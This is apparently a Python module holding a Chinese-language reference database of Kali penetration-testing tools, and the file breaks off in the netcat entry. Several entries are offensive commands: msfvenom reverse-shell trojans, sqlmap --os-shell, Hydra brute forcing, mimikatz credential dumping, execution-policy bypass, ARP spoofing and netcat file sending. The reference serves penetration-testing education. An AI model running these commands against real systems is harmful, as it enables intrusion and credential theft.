#!/usr/bin/env python3
"""
Kali工具自动检测与使用指南模块
自动扫描系统中已安装的Kali工具，并提供详细的使用说明
"""
import os
import subprocess
import json
from pathlib import Path

class KaliToolDetector:
    """Kali工具检测器"""
    
    # Kali工具分类及详细信息数据库
    TOOLS_DATABASE = {
        'Information Gathering': {
            'description': '信息收集工具 - 用于收集目标网络和系统的信息',
            'icon': '🔍',
            'tools': {
                'nmap': {
                    'name': 'Nmap',
                    'command': 'nmap -sV -sC {target}',
                    'description': '网络映射器和端口扫描器',
                    'usage': 'nmap [扫描类型] [选项] {目标}',
                    'examples': [
                        {'cmd': 'nmap -sV 192.168.1.1', 'desc': '扫描目标端口版本'},
                        {'cmd': 'nmap -sC -sV -p- 192.168.1.1', 'desc': '完整扫描所有端口'},
                        {'cmd': 'nmap -O 192.168.1.1', 'desc': '检测操作系统'},
                        {'cmd': 'nmap -sU 192.168.1.1', 'desc': 'UDP扫描'},
                        {'cmd': 'nmap --script vuln 192.168.1.1', 'desc': '漏洞扫描'},
                    ],
                    'tips': [
                        '使用 -sV 参数查看服务版本',
                        '使用 -Pn 跳过主机发现',
                        '使用 -T4-5 加快扫描速度',
                        '使用 -oA 输出所有格式'
                    ],
                    'common_options': {
                        '-sS': 'TCP SYN扫描（需要root）',
                        '-sT': 'TCP连接扫描',
                        '-sU': 'UDP扫描',
                        '-sV': '版本检测',
                        '-sC': '使用默认脚本',
                        '-O': '操作系统检测',
                        '-p': '指定端口',
                        '-oA': '输出所有格式',
                    }
                },
                'netdiscover': {
                    'name': 'Net Discover',
                    'command': 'netdiscover -i eth0',
                    'description': '主动/被动ARP扫描工具',
                    'usage': 'netdiscover [选项]',
                    'examples': [
                        {'cmd': 'netdiscover -i eth0', 'desc': '在指定网卡主动扫描'},
                        {'cmd': 'netdiscover -p', 'desc': '被动模式（隐蔽）'},
                        {'cmd': 'netdiscover -r 192.168.1.0/24', 'desc': '指定范围扫描'},
                    ],
                    'tips': [
                        '被动模式 -p 更隐蔽，不发送数据包',
                        '需要root权限运行',
                        '在Wireshark运行同时使用效果更好'
                    ],
                    'common_options': {
                        '-i': '指定网卡',
                        '-r': '扫描范围',
                        '-p': '被动模式',
                        '-l': '从文件读取范围',
                    }
                },
                'maltego': {
                    'name': 'Maltego',
                    'command': 'maltego',
                    'description': '强大的开源情报和取证应用程序',
                    'usage': 'maltego [参数]',
                    'examples': [
                        {'cmd': 'maltego', 'desc': '启动图形界面'},
                    ],
                    'tips': [
                        '需要注册账户使用',
                        '适合社会工程学信息收集',
                        '支持自定义转换'
                    ],
                    'common_options': {}
                },
                'theHarvester': {
                    'name': 'theHarvester',
                    'command': 'theHarvester -d {domain} -b all',
                    'description': '从公开来源收集邮箱、子域名等',
                    'usage': 'theHarvester -d {域名} -b {数据源}',
                    'examples': [
                        {'cmd': 'theHarvester -d example.com -b all', 'desc': '收集目标所有信息'},
                        {'cmd': 'theHarvester -d example.com -b google', 'desc': '只从Google收集'},
                        {'cmd': 'theHarvester -d example.com -b linkedin', 'desc': '从LinkedIn收集'},
                    ],
                    'tips': [
                        '-b 参数指定数据源',
                        '使用 all 会自动尝试所有源',
                        '适合收集邮件和员工信息'
                    ],
                    'common_options': {
                        '-d': '目标域名',
                        '-b': '数据源 (google, bing, linkedin, etc)',
                        '-l': '限制结果数量',
                        '-o': '输出到文件',
                    }
                },
                'recon-ng': {
                    'name': 'Recon-ng',
                    'command': 'recon-ng',
                    'description': 'Web侦察框架',
                    'usage': 'recon-ng [模块]',
                    'examples': [
                        {'cmd': 'recon-ng', 'desc': '启动交互式shell'},
                    ],
                    'tips': [
                        '类似Metasploit的界面',
                        '使用 marketplace install 安装模块',
                        '支持API key配置'
                    ],
                    'common_options': {}
                },
            }
        },
        'Vulnerability Analysis': {
            'description': '漏洞分析工具 - 用于识别和分析系统漏洞',
            'icon': '⚠️',
            'tools': {
                'nikto': {
                    'name': 'Nikto',
                    'command': 'nikto -h {url}',
                    'description': 'Web服务器扫描器，检测危险文件、CGI漏洞等',
                    'usage': 'nikto -h {URL} [选项]',
                    'examples': [
                        {'cmd': 'nikto -h http://target.com', 'desc': '扫描目标Web服务器'},
                        {'cmd': 'nikto -h http://target.com -ssl', 'desc': '扫描HTTPS'},
                        {'cmd': 'nikto -h http://target.com -o result.txt', 'desc': '输出到文件'},
                        {'cmd': 'nikto -h http://target.com -Tuning 1-4', 'desc': '指定扫描类型'},
                    ],
                    'tips': [
                        '可以检测20000+已知漏洞',
                        '扫描可能触发入侵检测系统',
                        '使用 -nointeractive 无人值守模式'
                    ],
                    'common_options': {
                        '-h': '目标主机',
                        '-ssl': '强制SSL',
                        '-o': '输出文件',
                        '-Tuning': '扫描类型',
                    }
                },
                'openvas': {
                    'name': 'OpenVAS',
                    'command': 'openvas-start',
                    'description': '开源漏洞扫描器和管理系统',
                    'usage': 'openvas-start [启动服务]',
                    'examples': [
                        {'cmd': 'openvas-start', 'desc': '启动OpenVAS服务'},
                        {'cmd': 'gvm-cli connect --xml "<get_tasks/>"', 'desc': 'CLI连接'},
                    ],
                    'tips': [
                        '需要先执行 openenvas-setup',
                        'Web界面通常在 https://localhost:9392',
                        '扫描需要较长时间'
                    ],
                    'common_options': {}
                },
                'nikto': {
                    'name': 'Nikto',
                    'command': 'nikto -h {url}',
                    'description': 'Web服务器漏洞扫描',
                    'usage': 'nikto -h URL [选项]',
                    'examples': [
                        {'cmd': 'nikto -h http://target.com', 'desc': '基础扫描'},
                    ],
                    'tips': ['全面Web漏洞检测'],
                    'common_options': {
                        '-h': '目标主机',
                        '-ssl': '启用SSL',
                        '-o': '输出文件',
                    }
                },
            }
        },
        'Web Application Analysis': {
            'description': 'Web应用分析工具 - 测试Web应用安全性',
            'icon': '🌐',
            'tools': {
                'sqlmap': {
                    'name': 'SQLMap',
                    'command': 'sqlmap -u "{url}" --batch',
                    'description': '自动化SQL注入检测和利用工具',
                    'usage': 'sqlmap [选项] -u {URL}',
                    'examples': [
                        {'cmd': 'sqlmap -u "http://target.com/?id=1"', 'desc': '检测SQL注入'},
                        {'cmd': 'sqlmap -u "http://target.com/?id=1" --batch --dbs', 'desc': '获取数据库'},
                        {'cmd': 'sqlmap -u "http://target.com/?id=1" -D dbname --tables', 'desc': '获取表'},
                        {'cmd': 'sqlmap -u "http://target.com/?id=1" --os-shell', 'desc': '获取系统shell'},
                        {'cmd': 'sqlmap -u "http://target.com/?id=1" --tamper=space2comment', 'desc': '使用绕过技术'},
                    ],
                    'tips': [
                        '使用 --batch 自动回答所有问题',
                        '使用 --dbs 列出所有数据库',
                        '使用 --risk 设置测试风险等级',
                        '遇到WAF使用 --random-agent'
                    ],
                    'common_options': {
                        '-u': '目标URL',
                        '--dbs': '列出数据库',
                        '-D': '指定数据库',
                        '--tables': '列出表',
                        '--columns': '列出列',
                        '--dump': '导出数据',
                        '--os-shell': '系统shell',
                        '--batch': '自动模式',
                        '--risk': '风险等级',
                    }
                },
                'dirb': {
                    'name': 'DIRB',
                    'command': 'dirb {url}',
                    'description': 'Web内容扫描器，查找隐藏目录和文件',
                    'usage': 'dirb {URL} [字典] [选项]',
                    'examples': [
                        {'cmd': 'dirb http://target.com', 'desc': '使用默认字典扫描'},
                        {'cmd': 'dirb http://target.com /usr/share/wordlists/dirb/common.txt', 'desc': '使用自定义字典'},
                        {'cmd': 'dirb https://target.com -o result.txt', 'desc': '保存结果'},
                        {'cmd': 'dirb http://target.com -w', 'desc': '忽略警告继续'},
                    ],
                    'tips': [
                        '可以自定义用户代理',
                        '支持Cookie设置',
                        '对于大字典可以后台运行'
                    ],
                    'common_options': {
                        '-w': '忽略警告',
                        '-o': '输出文件',
                        '-a': '设置User-Agent',
                    }
                },
                'gobuster': {
                    'name': 'Gobuster',
                    'command': 'gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt',
                    'description': '快速目录/文件/DNS/VHost暴力破解工具',
                    'usage': 'gobuster [模式] [选项]',
                    'examples': [
                        {'cmd': 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', 'desc': '目录扫描'},
                        {'cmd': 'gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt', 'desc': '子域名枚举'},
                        {'cmd': 'gobuster vhost -u http://target.com -w subdomains.txt', 'desc': 'VHost扫描'},
                        {'cmd': 'gobuster fuzz -u http://target.com/?param=FUZZ -w fuzz.txt', 'desc': '模糊测试'},
                    ],
                    'tips': [
                        '比DIRB速度更快',
                        '支持多线程',
                        '可以扫描DNS子域名'
                    ],
                    'common_options': {
                        '-u': '目标URL',
                        '-w': '字典路径',
                        '-t': '线程数',
                        '-o': '输出文件',
                    }
                },
                'burpsuite': {
                    'name': 'Burp Suite',
                    'command': 'burpsuite',
                    'description': 'Web应用安全测试集成平台',
                    'usage': 'burpsuite [参数]',
                    'examples': [
                        {'cmd': 'burpsuite', 'desc': '启动图形界面'},
                        {'cmd': 'burpsuite --community', 'desc': '启动社区版'},
                    ],
                    'tips': [
                        '需要配置浏览器代理 127.0.0.1:8080',
                        '使用Intruder进行暴力破解',
                        '使用Repeater测试请求',
                        '专业版有更多功能'
                    ],
                    'common_options': {}
                },
                'hydra': {
                    'name': 'Hydra',
                    'command': 'hydra -l {user} -P {password_list} {target} {service}',
                    'description': '快速网络登录暴力破解工具',
                    'usage': 'hydra [选项] {目标} {服务}',
                    'examples': [
                        {'cmd': 'hydra -l admin -P passwords.txt ssh://192.168.1.1', 'desc': 'SSH暴力破解'},
                        {'cmd': 'hydra -L users.txt -P passwords.txt http-post-form://target.com/login', 'desc': 'Web表单破解'},
                        {'cmd': 'hydra -l root -P passwords.txt ftp://192.168.1.1', 'desc': 'FTP暴力破解'},
                        {'cmd': 'hydra -L users.txt -P passwords.txt mysql://target.com', 'desc': 'MySQL暴力破解'},
                    ],
                    'tips': [
                        '确保有合法授权',
                        '使用 -t 调整线程数加快速度',
                        '可以破解多种协议'
                    ],
                    'common_options': {
                        '-l': '单个用户名',
                        '-L': '用户名列表',
                        '-p': '单个密码',
                        '-P': '密码列表',
                        '-t': '线程数',
                        '-V': '显示尝试详情',
                    }
                },
            }
        },
        'Password Attacks': {
            'description': '密码攻击工具 - 密码破解和暴力攻击',
            'icon': '🔐',
            'tools': {
                'john': {
                    'name': 'John the Ripper',
                    'command': 'john --wordlist=rockyou.txt {hash_file}',
                    'description': '快速密码破解工具，支持多种哈希算法',
                    'usage': 'john [选项] [密码文件]',
                    'examples': [
                        {'cmd': 'john --wordlist=rockyou.txt hashes.txt', 'desc': '使用字典破解'},
                        {'cmd': 'john hashes.txt --show', 'desc': '显示已破解的密码'},
                        {'cmd': 'john --format=md5 hashes.txt', 'desc': '指定哈希格式'},
                        {'cmd': 'john --rules --wordlist=rockyou.txt hashes.txt', 'desc': '使用规则增强'},
                    ],
                    'tips': [
                        '使用 --show 查看已破解密码',
                        '使用 --format 指定哈希类型',
                        '可以使用 : 表示使用默认格式'
                    ],
                    'common_options': {
                        '--wordlist': '密码字典',
                        '--show': '显示结果',
                        '--format': '哈希格式',
                        '--rules': '启用规则',
                    }
                },
                'hashcat': {
                    'name': 'Hashcat',
                    'command': 'hashcat -m {mode} -a {attack} {hash} {wordlist}',
                    'description': '世界上最快的密码恢复工具，使用GPU',
                    'usage': 'hashcat [选项] {哈希} [字典]',
                    'examples': [
                        {'cmd': 'hashcat -m 0 -a 0 hashes.txt rockyou.txt', 'desc': '字典攻击MD5'},
                        {'cmd': 'hashcat -m 1000 -a 3 hashes.txt ?d?d?d?d?d?d', 'desc': '暴力破解6位数字'},
                        {'cmd': 'hashcat -m 1800 -a 6 hashes.txt rockyou.txt ?a', 'desc': '混合攻击'},
                    ],
                    'tips': [
                        '使用 -m 指定哈希模式',
                        '使用 -a 指定攻击模式',
                        '支持GPU加速，比John快'
                    ],
                    'common_options': {
                        '-m': '哈希模式',
                        '-a': '攻击模式',
                        '-o': '输出文件',
                        '-i': '暴力增量',
                    }
                },
                'hydra': {
                    'name': 'Hydra',
                    'command': 'hydra -l admin -P passwords.txt target.com http-post-form',
                    'description': '网络服务密码暴力破解',
                    'usage': 'hydra [选项] 目标 服务',
                    'examples': [
                        {'cmd': 'hydra -l admin -P pass.txt ssh://target', 'desc': 'SSH破解'},
                        {'cmd': 'hydra -L users.txt -P pass.txt smb://target', 'desc': 'SMB破解'},
                    ],
                    'tips': ['支持多种协议'],
                    'common_options': {
                        '-l': '用户名',
                        '-L': '用户列表',
                        '-p': '密码',
                        '-P': '密码列表',
                    }
                },
                'cewl': {
                    'name': 'CeWL',
                    'command': 'cewl http://target.com -w words.txt',
                    'description': '从网站生成自定义密码字典',
                    'usage': 'cewl [选项] {URL}',
                    'examples': [
                        {'cmd': 'cewl http://target.com -w words.txt', 'desc': '生成字典'},
                        {'cmd': 'cewl http://target.com -m 6 -w words.txt', 'desc': '最小6字符'},
                        {'cmd': 'cewl http://target.com -d 3', 'desc': '爬取深度3层'},
                    ],
                    'tips': [
                        '从网站提取关键词',
                        '适合生成社工字典'
                    ],
                    'common_options': {
                        '-m': '最小单词长度',
                        '-d': '爬取深度',
                        '-w': '输出文件',
                    }
                },
            }
        },
        'Wireless Attacks': {
            'description': '无线攻击工具 - WiFi和蓝牙攻击',
            'icon': '📶',
            'tools': {
                'aircrack-ng': {
                    'name': 'Aircrack-ng',
                    'command': 'aircrack-ng -w {wordlist} {capture_file}',
                    'description': 'WiFi网络安全工具，用于监控和破解WEP/WPA',
                    'usage': 'aircrack-ng [选项] [捕获文件]',
                    'examples': [
                        {'cmd': 'aircrack-ng -w rockyou.txt capture.cap', 'desc': '破解WPA握手包'},
                        {'cmd': 'aircrack-ng capture.cap', 'desc': '分析WEP捕获'},
                        {'cmd': 'aircrack-ng -b AA:BB:CC:DD:EE:FF capture.cap', 'desc': '指定BSSID'},
                    ],
                    'tips': [
                        '需要先抓取握手包',
                        '使用airodump-ng抓包',
                        'WPA需要良好的字典'
                    ],
                    'common_options': {
                        '-w': '密码字典',
                        '-b': 'BSSID',
                        '-e': 'ESSID',
                    }
                },
                'wifite': {
                    'name': 'Wifite',
                    'command': 'wifite',
                    'description': '自动化无线攻击工具',
                    'usage': 'wifite [选项]',
                    'examples': [
                        {'cmd': 'wifite', 'desc': '启动自动化攻击'},
                        {'cmd': 'wifite --wpa', 'desc': '只攻击WPA'},
                        {'cmd': 'wifite --dict rockyou.txt', 'desc': '指定字典'},
                    ],
                    'tips': [
                        '自动处理大部分步骤',
                        '支持多种加密类型'
                    ],
                    'common_options': {
                        '--wpa': '只攻击WPA',
                        '--wep': '只攻击WEP',
                        '--dict': '密码字典',
                    }
                },
                'reaver': {
                    'name': 'Reaver',
                    'command': 'reaver -i wlan0 -b {bssid}',
                    'description': 'WPS暴力破解工具',
                    'usage': 'reaver -i {interface} -b {BSSID} [选项]',
                    'examples': [
                        {'cmd': 'reaver -i wlan0 -b AA:BB:CC:DD:EE:FF -vv', 'desc': 'WPS攻击'},
                        {'cmd': 'reaver -i wlan0 -b BSSID -w', 'desc': '使用WPS PIN'},
                    ],
                    'tips': [
                        '针对WPS PIN码攻击',
                        '可能需要较长时间'
                    ],
                    'common_options': {
                        '-i': '网卡',
                        '-b': 'BSSID',
                        '-vv': '详细输出',
                    }
                },
                'wash': {
                    'name': 'Wash',
                    'command': 'wash -i wlan0',
                    'description': 'WPS扫描工具',
                    'usage': 'wash -i {interface} [选项]',
                    'examples': [
                        {'cmd': 'wash -i wlan0', 'desc': '扫描WPS网络'},
                        {'cmd': 'wash -i wlan0 -C', 'desc': '检查是否锁定了WPS'},
                    ],
                    'tips': ['查找支持WPS的网络'],
                    'common_options': {
                        '-i': '网卡',
                        '-C': '检查WPS锁',
                    }
                },
            }
        },
        'Exploitation Tools': {
            'description': '漏洞利用工具 - 利用已知漏洞获取系统访问权限',
            'icon': '💀',
            'tools': {
                'msfconsole': {
                    'name': 'Metasploit Framework',
                    'command': 'msfconsole',
                    'description': '最流行的开源渗透测试框架',
                    'usage': 'msfconsole [选项]',
                    'examples': [
                        {'cmd': 'msfconsole', 'desc': '启动MSF控制台'},
                        {'cmd': 'msfconsole -q', 'desc': '静默启动'},
                        {'cmd': 'msfdb init', 'desc': '初始化数据库'},
                    ],
                    'tips': [
                        '使用 search 搜索模块',
                        '使用 use 选择模块',
                        '设置 options 配置参数',
                        '使用 exploit 或 run 执行'
                    ],
                    'common_options': {}
                },
                'searchsploit': {
                    'name': 'SearchSploit',
                    'command': 'searchsploit {keyword}',
                    'description': 'Exploit-DB命令行搜索工具',
                    'usage': 'searchsploit [选项] [关键词]',
                    'examples': [
                        {'cmd': 'searchsploit apache', 'desc': '搜索Apache漏洞'},
                        {'cmd': 'searchsploit -w apache', 'desc': '显示Exploit-DB链接'},
                        {'cmd': 'searchsploit -m 12345', 'desc': '复制漏洞到当前目录'},
                        {'cmd': 'searchsploit "Remote Code Execution"', 'desc': '精确搜索'},
                    ],
                    'tips': [
                        '使用 -w 显示在线链接',
                        '使用 -m 复制漏洞代码',
                        '定期执行 searchsploit -u 更新'
                    ],
                    'common_options': {
                        '-w': '显示在线链接',
                        '-m': '复制漏洞',
                        '-u': '更新',
                    }
                },
                'msfvenom': {
                    'name': 'Msfvenom',
                    'command': 'msfvenom -p {payload} LHOST={ip} LPORT={port} -f {format} -o shell.elf',
                    'description': '生成各种格式的恶意代码和Shellcode',
                    'usage': 'msfvenom [选项]',
                    'examples': [
                        {'cmd': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf', 'desc': 'Linux木马'},
                        {'cmd': 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe', 'desc': 'Windows木马'},
                        {'cmd': 'msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > app.apk', 'desc': 'Android木马'},
                        {'cmd': 'msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444', 'desc': 'Python Payload'},
                    ],
                    'tips': [
                        '-p 指定payload',
                        '-f 指定输出格式',
                        '-e 使用编码器',
                        '-i 编码次数'
                    ],
                    'common_options': {
                        '-p': 'payload',
                        '-f': '输出格式',
                        '-e': '编码器',
                        '-i': '编码次数',
                        '-o': '输出文件',
                    }
                },
            }
        },
        'Sniffing & Spoofing': {
            'description': '嗅探与欺骗工具 - 网络流量分析和欺骗攻击',
            'icon': '👂',
            'tools': {
                'wireshark': {
                    'name': 'Wireshark',
                    'command': 'wireshark',
                    'description': '网络协议分析器，捕获和分析网络数据包',
                    'usage': 'wireshark [选项] [捕获接口]',
                    'examples': [
                        {'cmd': 'wireshark', 'desc': '启动图形界面'},
                        {'cmd': 'wireshark -i eth0', 'desc': '捕获指定接口'},
                        {'cmd': 'wireshark -k', 'desc': '立即开始捕获'},
                    ],
                    'tips': [
                        '使用过滤器减少噪音',
                        '使用 tcpdump 快速查看',
                        '支持导出各种格式'
                    ],
                    'common_options': {
                        '-i': '捕获接口',
                        '-k': '立即开始',
                        '-w': '保存文件',
                    }
                },
                'tcpdump': {
                    'name': 'Tcpdump',
                    'command': 'tcpdump -i eth0',
                    'description': '命令行数据包分析器',
                    'usage': 'tcpdump [选项] [表达式]',
                    'examples': [
                        {'cmd': 'tcpdump -i eth0', 'desc': '捕获所有流量'},
                        {'cmd': 'tcpdump -i eth0 port 80', 'desc': '捕获HTTP流量'},
                        {'cmd': 'tcpdump -i eth0 -w capture.pcap', 'desc': '保存到文件'},
                        {'cmd': 'tcpdump -i eth0 host 192.168.1.1', 'desc': '过滤主机'},
                    ],
                    'tips': [
                        '使用 -n 避免DNS解析',
                        '使用表达式过滤',
                        '配合Wireshark分析'
                    ],
                    'common_options': {
                        '-i': '接口',
                        '-n': '不解析DNS',
                        '-w': '保存文件',
                        'port': '端口过滤',
                    }
                },
                'ettercap': {
                    'name': 'Ettercap',
                    'command': 'ettercap -G',
                    'description': '中间人攻击工具',
                    'usage': 'ettercap [选项]',
                    'examples': [
                        {'cmd': 'ettercap -G', 'desc': '图形界面'},
                        {'cmd': 'ettercap -T -i eth0 -M arp:remote /192.168.1.1// /192.168.1.2//', 'desc': 'ARP欺骗'},
                    ],
                    'tips': [
                        '支持ARP和DNS欺骗',
                        '可以注入代码',
                        '使用etterfilter编译过滤器'
                    ],
                    'common_options': {
                        '-T': '文本模式',
                        '-G': '图形模式',
                        '-i': '接口',
                        '-M': '攻击方法',
                    }
                },
                'dsniff': {
                    'name': 'Dsniff',
                    'command': 'dsniff -i eth0',
                    'description': '网络密码嗅探工具',
                    'usage': 'dsniff [选项]',
                    'examples': [
                        {'cmd': 'dsniff -i eth0', 'desc': '开始嗅探'},
                        {'cmd': 'dsniff -i eth0 -w log.txt', 'desc': '保存结果'},
                    ],
                    'tips': [
                        '可以捕获明文密码',
                        '支持多种协议'
                    ],
                    'common_options': {
                        '-i': '接口',
                        '-w': '保存文件',
                    }
                },
            }
        },
        'Post Exploitation': {
            'description': '后渗透工具 - 获取系统权限后的操作',
            'icon': '🎯',
            'tools': {
                'mimikatz': {
                    'name': 'Mimikatz',
                    'command': 'mimikatz',
                    'description': 'Windows凭证提取工具',
                    'usage': 'mimikatz [命令]',
                    'examples': [
                        {'cmd': 'mimikatz', 'desc': '启动程序'},
                        {'cmd': 'privilege::debug', 'desc': '提升权限'},
                        {'cmd': 'sekurlsa::logonpasswords', 'desc': '提取密码'},
                        {'cmd': 'lsadump::sam', 'desc': '读取SAM数据库'},
                    ],
                    'tips': [
                        '需要管理员权限',
                        '提取明文密码',
                        '支持Pass-the-Hash'
                    ],
                    'common_options': {}
                },
                'empire': {
                    'name': 'PowerShell Empire',
                    'command': 'empire',
                    'description': 'PowerShell后渗透框架',
                    'usage': 'empire [启动命令]',
                    'examples': [
                        {'cmd': 'empire', 'desc': '启动Empire'},
                        {'cmd': 'listeners', 'desc': '查看监听器'},
                        {'cmd': 'agents', 'desc': '查看代理'},
                    ],
                    'tips': [
                        '类似Metasploit',
                        '纯内存执行',
                        '支持PowerShell'
                    ],
                    'common_options': {}
                },
                'powershell': {
                    'name': 'PowerShell',
                    'command': 'powershell -ExecutionPolicy Bypass -Command "{command}"',
                    'description': 'Windows PowerShell命令行',
                    'usage': 'powershell [选项]',
                    'examples': [
                        {'cmd': 'powershell -Version 2', 'desc': '使用特定版本'},
                        {'cmd': 'powershell -EncodedCommand ZQBjAGgAbwAgACIA...', 'desc': '执行编码命令'},
                    ],
                    'tips': [
                        'Linux也有PowerShell',
                        '支持对象管道',
                        '使用 -ExecutionPolicy Bypass 绕过策略'
                    ],
                    'common_options': {
                        '-ExecutionPolicy': '执行策略',
                        '-EncodedCommand': '编码命令',
                        '-NoProfile': '不加载配置',
                    }
                },
            }
        },
        'Forensics': {
            'description': '数字取证工具 - 文件分析和恢复',
            'icon': '🔬',
            'tools': {
                'autopsy': {
                    'name': 'Autopsy',
                    'command': 'autopsy',
                    'description': '数字取证平台和浏览器',
                    'usage': 'autopsy [案例路径]',
                    'examples': [
                        {'cmd': 'autopsy', 'desc': '启动图形界面'},
                        {'cmd': 'autopsy /cases/case1', 'desc': '打开案例'},
                    ],
                    'tips': [
                        '基于The Sleuth Kit',
                        '支持磁盘镜像分析',
                        '可以恢复删除文件'
                    ],
                    'common_options': {}
                },
                'foremost': {
                    'name': 'Foremost',
                    'command': 'foremost -i {image} -o {output}',
                    'description': '文件恢复工具，根据文件头恢复',
                    'usage': 'foremost [选项] -i {文件}',
                    'examples': [
                        {'cmd': 'foremost -i disk.img -o output', 'desc': '从镜像恢复'},
                        {'cmd': 'foremost -t jpg,png -i disk.img', 'desc': '只恢复图片'},
                        {'cmd': 'foremost -v -i disk.img', 'desc': '详细模式'},
                    ],
                    'tips': [
                        '根据文件头恢复',
                        '支持多种文件类型',
                        '恢复后保存在output目录'
                    ],
                    'common_options': {
                        '-i': '输入文件',
                        '-o': '输出目录',
                        '-t': '文件类型',
                        '-v': '详细模式',
                    }
                },
                'binwalk': {
                    'name': 'Binwalk',
                    'command': 'binwalk {file}',
                    'description': '固件分析工具，查找嵌入文件',
                    'usage': 'binwalk [选项] {文件}',
                    'examples': [
                        {'cmd': 'binwalk firmware.bin', 'desc': '分析固件'},
                        {'cmd': 'binwalk -e firmware.bin', 'desc': '自动提取'},
                        {'cmd': 'binwalk -B firmware.bin', 'desc': '只搜索签名'},
                        {'cmd': 'binwalk --dd=".*" firmware.bin', 'desc': '提取所有'},
                    ],
                    'tips': [
                        '分析固件结构',
                        '使用 -e 自动提取',
                        '使用 -M 递归提取'
                    ],
                    'common_options': {
                        '-e': '自动提取',
                        '-B': '只搜索签名',
                        '-M': '递归提取',
                        '-d': '提取深度',
                    }
                },
            }
        },
        'Reporting Tools': {
            'description': '报告工具 - 生成渗透测试报告',
            'icon': '📝',
            'tools': {
                'dradis': {
                    'name': 'Dradis',
                    'command': 'cd /opt/dradis-ce && ./bin/devices server',
                    'description': '安全报告和协作平台',
                    'usage': 'dradis [启动方式]',
                    'examples': [
                        {'cmd': 'cd /opt/dradis-ce && ./bin/devices server', 'desc': '启动服务'},
                    ],
                    'tips': [
                        '团队协作工具',
                        '支持导入各种工具输出',
                        '生成专业报告'
                    ],
                    'common_options': {}
                },
                'magic-tree': {
                    'name': 'MagicTree',
                    'command': 'magic-tree',
                    'description': '渗透测试数据管理工具',
                    'usage': 'magic-tree [文件]',
                    'examples': [
                        {'cmd': 'magic-tree report.gnmap', 'desc': '打开nmap输出'},
                    ],
                    'tips': [
                        '树形结构组织数据',
                        '支持查询语言'
                    ],
                    'common_options': {}
                },
            }
        },
        'Reverse Engineering': {
            'description': '逆向工程工具 - 分析二进制文件',
            'icon': '🔧',
            'tools': {
                'ghidra': {
                    'name': 'Ghidra',
                    'command': 'ghidraRun',
                    'description': 'NSA开源逆向工程框架',
                    'usage': 'ghidraRun [选项]',
                    'examples': [
                        {'cmd': 'ghidraRun', 'desc': '启动Ghidra'},
                        {'cmd': 'analyzeHeadless /project test.exe -scriptPath /scripts', 'desc': '无头分析'},
                    ],
                    'tips': [
                        '支持多种处理器',
                        '类似IDA Pro',
                        '可以编写脚本'
                    ],
                    'common_options': {}
                },
                'radare2': {
                    'name': 'Radare2',
                    'command': 'r2 {binary}',
                    'description': '命令行逆向工程框架',
                    'usage': 'r2 [选项] [文件]',
                    'examples': [
                        {'cmd': 'r2 binary', 'desc': '打开文件'},
                        {'cmd': 'aaa', 'desc': '分析所有'},
                        {'cmd': 'afl', 'desc': '列出函数'},
                        {'cmd': 'pdf', 'desc': '反汇编当前函数'},
                    ],
                    'tips': [
                        '使用 aaa 分析代码',
                        '使用 afl 列出函数',
                        'pdf 查看反汇编'
                    ],
                    'common_options': {
                        '-w': '可写模式',
                        '-2': '2字节对齐',
                    }
                },
                'strace': {
                    'name': 'Strace',
                    'command': 'strace {command}',
                    'description': '系统调用跟踪工具',
                    'usage': 'strace [选项] [命令]',
                    'examples': [
                        {'cmd': 'strace -f ./program', 'desc': '跟踪程序'},
                        {'cmd': 'strace -p PID', 'desc': '跟踪进程'},
                        {'cmd': 'strace -e openat -o log.txt ./program', 'desc': '只跟踪openat'},
                    ],
                    'tips': [
                        '-f 跟踪fork的子进程',
                        '-e 指定系统调用',
                        '-o 输出到文件'
                    ],
                    'common_options': {
                        '-f': '跟踪子进程',
                        '-e': '系统调用',
                        '-o': '输出文件',
                    }
                },
            }
        },
        'System Utilities': {
            'description': '系统工具 - 系统管理和网络工具',
            'icon': '⚙️',
            'tools': {
                'ifconfig': {
                    'name': 'Ifconfig',
                    'command': 'ifconfig',
                    'description': '配置网络接口',
                    'usage': 'ifconfig [接口] [选项]',
                    'examples': [
                        {'cmd': 'ifconfig', 'desc': '显示所有接口'},
                        {'cmd': 'ifconfig eth0', 'desc': '显示eth0'},
                        {'cmd': 'ifconfig eth0 192.168.1.100 netmask 255.255.255.0', 'desc': '设置IP'},
                        {'cmd': 'ifconfig eth0 up', 'desc': '启用接口'},
                    ],
                    'tips': [
                        'ip addr 是新命令',
                        '可以临时配置IP'
                    ],
                    'common_options': {
                        'up': '启用接口',
                        'down': '禁用接口',
                        'netmask': '子网掩码',
                    }
                },
                'netstat': {
                    'name': 'Netstat',
                    'command': 'netstat -tulnp',
                    'description': '显示网络连接、路由表等',
                    'usage': 'netstat [选项]',
                    'examples': [
                        {'cmd': 'netstat -tulnp', 'desc': '显示监听端口'},
                        {'cmd': 'netstat -an', 'desc': '显示所有连接'},
                        {'cmd': 'netstat -r', 'desc': '显示路由表'},
                    ],
                    'tips': [
                        'ss 是netstat的新版本',
                        '使用 -t TCP',
                        '使用 -u UDP'
                    ],
                    'common_options': {
                        '-t': 'TCP',
                        '-u': 'UDP',
                        '-l': '监听',
                        '-n': '数字地址',
                        '-p': '显示进程',
                    }
                },
                'ss': {
                    'name': 'SS',
                    'command': 'ss -tulnp',
                    'description': 'Socket统计，比netstat更快',
                    'usage': 'ss [选项]',
                    'examples': [
                        {'cmd': 'ss -tulnp', 'desc': '显示监听端口'},
                        {'cmd': 'ss -s', 'desc': '显示统计'},
                        {'cmd': 'ss -tp', 'desc': '显示进程'},
                    ],
                    'tips': [
                        '比netstat快',
                        '可以过滤连接状态'
                    ],
                    'common_options': {
                        '-t': 'TCP',
                        '-u': 'UDP',
                        '-l': '监听',
                        '-p': '显示进程',
                    }
                },
                'nc': {
                    'name': 'Netcat',
                    'command': 'nc -lvp 4444',
                    'description': '网络瑞士军刀',
                    'usage': 'nc [选项]',
                    'examples': [
                        {'cmd': 'nc -lvp 4444', 'desc': '监听端口'},
                        {'cmd': 'nc -nv 192.168.1.1 4444', 'desc': '连接远程'},
                        {'cmd': 'nc -lvp 4444 > file.bin', 'desc': '接收文件'},
                        {'cmd': 'cat file | nc target 4444', 'desc': '发送文件'},
